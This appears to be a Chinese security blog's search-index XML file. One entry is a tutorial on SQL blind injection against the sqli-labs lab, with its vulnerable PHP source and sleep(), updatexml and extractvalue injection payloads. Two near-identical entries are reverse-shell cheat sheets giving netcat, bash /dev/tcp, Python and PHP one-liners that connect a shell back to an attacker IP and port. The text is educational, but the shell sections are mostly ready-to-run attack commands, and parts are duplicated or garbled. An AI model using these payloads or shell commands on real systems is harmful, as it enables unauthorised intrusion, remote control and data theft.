<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[高级SQL注入]]></title>
    <url>%2F2019%2F12%2F31%2F%E9%AB%98%E7%BA%A7SQL%E6%B3%A8%E5%85%A5.html</url>
    <content type="text"><![CDATA[课程简介 主要讲解SQL盲注基本概念，SQL盲注的挖掘方式和详细的利用过程（猜解库、表、字段名和字段内容），使用二分法基于SQL盲注漏洞的python脚本开发详解。 主要讲解常用SQL注入自动化工具的使用，非常规SQL注入漏洞的挖掘与利用，常见Waf限制下的SQL注入绕过姿势和技巧，SQL注入漏洞的防御手段详解。 一、 SQL盲注1.1 SQL盲注的概述​ 对于正常的SQL注入漏洞来说，我们一般是可以直接通过页面回显的信息情况进行判断，当前位置是否存在注入，从而进一步去猜解当前数据库的库名、表名、字段名以及字段内容。但对于SQL盲注来说，是不能通过直接显示的途径来获取数据库的数据的。在盲注中，攻击者只能根据其页面返回的不同来判断，可能是页面内容的不同（报错），也可能是页面的响应时间不同（时间）等。 1.2 SQL盲注的分类 布尔盲注 时间盲注 报错盲注 二、SQL盲注的挖掘2.1 布尔盲注2.1.1 概述​ 页面只返回True和False两种页面类型，利用页面返回不同，逐一猜解数据内容的方式，我们称为布尔盲注。 2.1.2 注入点判断 方法：单引号带入法 这边使用一个sqlilab的一个环境，正常情况下请求目标服务器的url:http://192.168.55.103/Less-8/?id=1，页面是可以正常显示。 在id位置处带入单引号url:http://192.168.55.103/Less-8/?id=1&#39;,发现页面没有数据的正常回显。 注：通过页面的回显结果，正常输入页面返回正常为True，带入单引号造成原始数据库查询语句报错，返回的页面结果为空，但是并有错误信息输出，为False。通过上述测试方法判断。 源代码分析 1234567891011121314151617181920212223242526272829303132333435&lt;?php//including the Mysql connect parameters.include("../sql-connections/sql-connect.php");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123; $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id."\n"); fclose($fp); // connectivity $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size="5" color="#FFFF00"&gt;'; echo 'You are in...........'; echo "&lt;br&gt;"; echo "&lt;/font&gt;"; &#125; else &#123;echo '&lt;font size="5" color="#FFFF00"&gt;'; //echo 'You are in...........'; //print_r(mysql_error()); //echo "You have an error in your SQL syntax"; echo "&lt;/br&gt;&lt;/font&gt;"; echo '&lt;font color= "#0000ff" font size= 3&gt;'; &#125;&#125; else &#123; echo "Please input the ID as parameter with numeric value";&#125;?&gt; 上述代码为当前环境查询数据调用数据库的php源代码，我们主要来分析源代码中主要的部分。 $id=$_GET[&#39;id&#39;]； 接收用户输入id的值 当用户正常输入1时，此时$id=1 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;此为数据库的查询语句 用户输入数据后，原查询语句为 $sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39; LIMIT 0,1&quot;; 带入到数据库查询后，就将id=1的数据内容返回给浏览器 当我们带入非法字符单引号的时候，此时$id=1&#39; 原查询语句为 $sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39;&#39; LIMIT 0,1&quot;; 我们发现原本查询语句中有单引号，当我们带入单引号时，会导致原本的单引号无法闭合而造成查询语句报错，无法正常查询数据内容 2.2 时间盲注2.2.1 概述​ 正常情况下，当对数据库进行查询操作时，如果查询条件不存在，语句执行的时间是0ms；如果查询条件满足，语句执行速度也会非常快，接近0ms；这时候，可以使用sleep()或BENCHMARK()函数,在满足条件时，对查询的时间进行延长，通过浏览器的响应时间判断是否存在时间盲注。 2.2.3 时间盲注和布尔盲注的区别​ 前面讲过布尔盲注，这里有小伙伴可能会质疑二者有什么区别，可以想象一个场景，无论输入任何字符（不管是正确的语句，还是恶意的注入语句），web页面都会正常显示（页面被管理员采用了”重定向”或”屏蔽”等措施），这样就无法通过布尔盲注进行判断是否存在注入了，只能通过时间延迟判断。 2.2.3 注入点判断 判断函数 sleep(n) 格式：sleep(n)，n为设置的时间，单位是s(秒)； 定义：时间延迟函数，借助此函数可以在processlist中捕获到执行迅速不易被查看到的语句，以确定程序是否确实在server端发起该语句。 使用细节： 正常查询数据的时间为0s 带入sleep函数查询数据的时间 从图中我们可以清楚的看到，带入sleep函数的查询语句，查询数据的时间明显增长 benchmark()函数 格式：benchmark(count,expr)，执行表达式expr的count(重复次数) 定义：用来测试mysql进程有多快，设定好执行expr(表达式)的次数(count)，可以看到时间的变化； 使用细节： 页面延时法 首先，我们正常请求目标页面url:http://192.168.55.106/Less-9/?id=1，页面正常返回数据结果 带入单引号进行测试尝试，此时url为url:http://192.168.55.106/Less-9/?id=1&#39;，请求之后我们发现页面显示结果和原来一样，没有任何变化。这就回到我们所讲到的时间盲注和布尔盲注的一个区别，我们可能无法从页面响应结果进行直接判断。 带入sleep函数镜进行测试判断，此时url为url:http://192.168.55.106/Less-9/?id=1&#39; and sleep(5)--+，我们发现页面结果的回显时间明显增长。 综上测试过程，我们可以通过页面响应的时间判断，当前页面是否存在注入。当我们带入sleep函数时，我们可以判断出因为sleep能延长数据的查询时间，我们在请求页面时，我们构造的sleep函数被带入到了原有的查询语句中去执行，导致了页面响应时间变长，由此我们可以判断出当前页面存在时间盲注。 源代码分析 123456789101112131415161718192021222324252627282930if(isset($_GET[&apos;id&apos;]))&#123;$id=$_GET[&apos;id&apos;];//logging the connection parameters to a file for analysis.$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);fclose($fp);$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; //print_r(mysql_error()); //echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt; $id=$_GET[&#39;id&#39;]获取用户输入的id值 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;数据库执行语句 在前面我们带入延时函数的格式为1&#39; and sleep(5)--+ 从原语句我们可以看出我们带入构造语句后，原查询语句变成: SELECT * FROM users WHERE id=&#39;1&#39; and sleep(5)--+&#39;LIMIT 0,1 这里的单引号用来闭合前一个单引号 –+为sql代码中的注释符，它可以将后面的代码完全注释掉，就形成了一个新的查询语句执行，这样sleep函数就被成功写入，导致查询数据结果的时间变长。 2.3 报错盲注2.3.1 原理​ 基于报错的盲注是通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而使我们得到想要的基本信息——数据库名、版本、用户名等。 ​ 因为mysql有一个bug，这个bug在使用count() group by 对一些rand()函数进行操作时会返回错误信息rand()产生的数列是关键，而且想获取的数据库信息会显示在报错信息中。 2.3.2 涉及函数 count() 作用:统计元组（每条数据）的个数。 rand() 作用：随机取0-1的数字 通常和floor()函数（向下取整）连用，将rand()乘以 2 是为了能得到 1 和 0 两个随机数； concat()函数 作用：聚合函数，将多个列数据合并到一个字符串中 exp()函数 作用: 返回以e的x次方的值； 格式：exp(x) 漏洞利用：使double类型的数值超出范围从而查看报错的信息，需要mysql版本在5.5.x及以上,但是在mysql&gt;5.5.53时，则不能返回查询结果 利用语句： 1select exp(~(select * from(select version())as a )); updatexml()函数 作用: 对xml文档进行查询和修改； 格式：updatexml(xml_document,XPath_string,new_value); xml_document: String格式,为xml文档对象的名称; XPath_string: Xpath格式的字符串,可以了解下xpath语法; new_value: String格式,替换查找到的符合条件的数 报错利用：mysql版本需要5.1.x及以上 利用命令： 1select 1,updatexml(1,concat(char(38),(select @@version),char(38)),1); extractvalue()函数 作用：对xml文档进行查询和修改； 格式：extractvalue(xml_frag,xpath_expr) xml_frag: xml标记 xpath_expr: xpath表达式 报错利用：利用extractvalue函数的报错信息获取信息，mysql版本需要5.1.x及以上 利用命令： 1select 1,extractvalue(1,concat(char(38),(select @@version),char(38))); group by 作用：聚合函数，根据一个或多个列对结果集进行分组并有排序功能 报错注入公式 select count(*),concat(0x22,database(),0x22,floor(rand(0)*2))x from information_schema.tables group by x; 0x22: 表示双引号 x:相当于把concat获取的数据列更名为x，也是为了方便group by的操作 注：疑问解答，这里的rand内为什么要加0？ rand内加随机因子0是保证报错百分之百触发 不加随机因子0，可能不触发报错 关键表被禁用，可用如下格式 1select count(*) from (select 1 union select null union select !1) as a group by concat(version(),floor(rand(0)*2)); 注：这边一定要对select 1 union select null union select !1这个语句使用别名，否则会报错 rand()函数被禁用 1select min(@a:=1) from information_schema.tables group by concat(database(),@a:=(@a+1)%2); 利用myslq的重复性导致报错来获取信息 1select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; 2.3.3 注入点的判断 源代码分析 123456789101112131415161718192021222324252627if(isset($_GET[&apos;id&apos;]))&#123;$id=$_GET[&apos;id&apos;];//logging the connection parameters to a file for analysis.$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);fclose($fp);$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt; 查看源码，与原来的没差。但是我们发现，在判断语句当中，当sql语句正确的情况下，直接输出You are in的字符串。 但是当我们构造报错语句，导致sql报错，这边的print_r(mysql_error());语句就会输出错误语句到浏览器端供用户查看。这边我们就可以更好利用报错注入进行相关数据库的注入攻击。 单引号带入 正常请求：url:http://192.168.55.104/Less-5/?id=1 单引号带入: url:http://192.168.55.104/Less-5/?id=1&#39; 综上测试，发现数据库报错，判断存在注入。并且这边只是输出了错误信息。只能用报错盲注。 三、 SQL盲注的利用3.1 二分法3.2 布尔盲注3.2.1 常用函数详解3.2.2 拆解库名3.2.3 猜解表名3.2.4 猜解字段名3.2.5 猜解字段内容3.3 时间盲注3.3.1 常用函数详解3.3.2 拆解库名3.3.3 猜解表名3.3.4 猜解字段名3.3.5 猜解字段内容3.4 报错盲注3.4.1 常用函数详解3.4.2 拆解库名3.4.3 猜解表名3.4.4 猜解字段名3.4.5 猜解字段内容四、基于SQL盲注的脚本开发五、常用SQL注入工具精讲六、常见SQL注入的挖掘与利用七、常见SQL注入的绕过姿势与技巧八、SQL注入的防御手段]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nc反弹shell详解]]></title>
    <url>%2F2019%2F12%2F22%2Fnc%E5%8F%8D%E5%BC%B9shell%E8%AF%A6%E8%A7%A3-1.html</url>
    <content type="text"><![CDATA[概述nc为netcat，可以进行服务器端口监听，然后把服务器的一个shell反弹回来，然后可以在本地终端控制服务器终端。 Windows下正向连接：123服务器执行：nc –l –p 8888 –e cmd.exe 本地主机执行：nc –vv 服务器ip 8888 反向连接：123 服务器执行：nc –e cmd.exe 公网ip 8888​ 公网主机执行：nc –lvp 8888 Linux下方法一：​ 反弹shell命令： 1bash –i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 ​ kali端口监听： 1nc –lvvp 8888 注：shell三种标准文件描述符： ​ 0 – stdin 代表标准输入，使用&lt;或&lt;&lt; ​ 1 – stdout 代表标准输出，使用&gt;或&gt;&gt; ​ 2 – stderr 代表标准错误输出，使用2&gt;或2&gt;&gt; ​ &gt;&amp;的含义： ​ 当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。 ​ 当&gt;&amp;后面接文件描述时，表示将前面的文件描述符重定向至后面的文件描述符 方法二：使用python反弹shell： 1Python –c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.5.100',8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);" 方法三： 使用nc工具反弹shell： 123 nc –e /bin/bash ip 7777​ nc –lvvp 7777 方法四：使用php反弹shell： 123 php- 'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777")'​ php -r '$sock=fsockopen("192.168.0.4",7777);exec("/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3");']]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F05%2F28%2Fnc%E5%8F%8D%E5%BC%B9shell%E8%AF%A6%E8%A7%A3.html</url>
    <content type="text"><![CDATA[layout: posttitle: nc反弹shell详解author: Mr.zhangcategories: Security date: 2019-11-30 17:30:00tags:内网渗透 概述nc为netcat，可以进行服务器端口监听，然后把服务器的一个shell反弹回来，然后可以在本地终端控制服务器终端。 Windows下正向连接：123服务器执行：nc –l –p 8888 –e cmd.exe 本地主机执行：nc –vv 服务器ip 8888 反向连接：123 服务器执行：nc –e cmd.exe 公网ip 8888​ 公网主机执行：nc –lvp 8888 Linux下方法一：​ 反弹shell命令： 1bash –i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 ​ kali端口监听： ​ nc –lvvp 8888 注：shell三种标准文件描述符： ​ 0 – stdin 代表标准输入，使用&lt;或&lt;&lt; ​ 1 – stdout 代表标准输出，使用&gt;或&gt;&gt; ​ 2 – stderr 代表标准错误输出，使用2&gt;或2&gt;&gt; ​ &gt;&amp;的含义： ​ 当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。 ​ 当&gt;&amp;后面接文件描述时，表示将前面的文件描述符重定向至后面的文件描述符 \方法二****：**** ​ 使用python反弹shell： Python –c “import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘192.168.5.100’,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([‘/bin/bash’,’-i’]);” \方法三：** ​ 使用nc工具反弹shell： ​ nc –e /bin/bash ip 7777 ​ nc –lvvp 7777 \方法四：** ​ 使用php反弹shell： ​ php- ‘exec(“/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777”)’ ​ php -r ‘$sock=fsockopen(“192.168.0.4”,7777);exec(“/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3”);’]]></content>
  </entry>
</search>
